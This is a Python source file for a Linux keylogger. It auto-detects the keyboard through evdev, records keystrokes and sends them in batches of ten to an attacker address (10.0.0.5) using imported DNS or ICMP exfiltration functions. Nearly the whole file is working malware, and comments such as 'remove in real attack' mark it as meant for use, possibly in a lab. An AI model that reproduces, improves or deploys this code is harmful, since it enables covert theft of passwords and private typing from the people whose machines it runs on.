import evdev
from evdev import InputDevice, categorize, ecodes

# --- EXFILTRATION MODULES ---
# We import both so you can easily switch between them
from dns_exfil import send_data_over_dns
from icmp_exfil import send_data_over_icmp  # <--- NEW IMPORT

def find_keyboard_path():
    """
    Auto-detects the first device that looks like a keyboard.
    Returns the path string (e.g., '/dev/input/event2') or None.
    """
    try:
        # List all input devices
        devices = [evdev.InputDevice(path) for path in evdev.list_devices()]
        
        for device in devices:
            # Check if "keyboard" is in the device name (case insensitive)
            if "keyboard" in device.name.lower():
                print(f"[*] Auto-detected Keyboard: {device.name} at {device.path}")
                return device.path
        
        print("[-] No keyboard found automatically!")
        return None
    except Exception as e:
        print(f"[-] Error searching for devices: {e}")
        return None

# --- MAIN CONFIGURATION ---

# Instead of hardcoding "/dev/input/event6", we auto-detect it.
KEYBOARD_EVENT = find_keyboard_path()

# Fallback: If auto-detect fails, tell the user to check manually
if not KEYBOARD_EVENT:
    print("[!] Auto-detection failed. Please check your devices using 'ls -l /dev/input/by-path/' or 'sudo evtest'.")
    exit()

try:
    keyboard = InputDevice(KEYBOARD_EVENT)
    print(f"[+] Listening for keystrokes on {KEYBOARD_EVENT}...")
    print(f"[+] Data will be sent to Attacker (10.0.0.5) every 10 keystrokes.")

    # Buffer to store keys before sending
    keystroke_buffer = ""
    SEND_THRESHOLD = 10  # Send data after every 10 keys

    for event in keyboard.read_loop():
        if event.type == ecodes.EV_KEY:
            key_event = categorize(event)
            if key_event.keystate == key_event.key_down:

                # 1. Clean the key name (Remove "KEY_" prefix)
                raw_key = key_event.keycode
                # Sometimes keycode is a list [KEY_A, ...], handle that just in case
                if isinstance(raw_key, list):
                    raw_key = raw_key[0]
                
                clean_key = str(raw_key).replace("KEY_", "")

                # Handle space and enter for better readability
                if clean_key == "SPACE": clean_key = " "
                elif clean_key == "ENTER": clean_key = "[ENT]"
                elif clean_key == "BACKSPACE": clean_key = "[<]"
                elif "SHIFT" in clean_key: clean_key = "" # Ignore shift keys for cleaner logs

                # 2. Add to buffer
                keystroke_buffer += clean_key
                # Optional: Print locally for debugging (remove in real attack)
                print(f"Buffer: {keystroke_buffer}", end="\r") 

                # 3. Check if buffer is full, then EXFILTRATE
                if len(keystroke_buffer) >= SEND_THRESHOLD:
                    print(f"\n[>] Sending Buffer: {keystroke_buffer}")
                    
                    # --- SWITCHING TO ICMP ---
                    # To use DNS instead, uncomment the line below:
                    # send_data_over_dns(keystroke_buffer)
                    
                    # Current active method: ICMP Timing
                    send_data_over_icmp(keystroke_buffer) 
                    
                    keystroke_buffer = "" # Reset buffer

except KeyboardInterrupt:
    print("\n[+] Keylogger stopped cleanly.")
except OSError:
    print(f"\n[!] Error: Could not access {KEYBOARD_EVENT}. Did you run with 'sudo'?")
except Exception as e:
    print(f"\n[!] Unexpected Error: {e}")
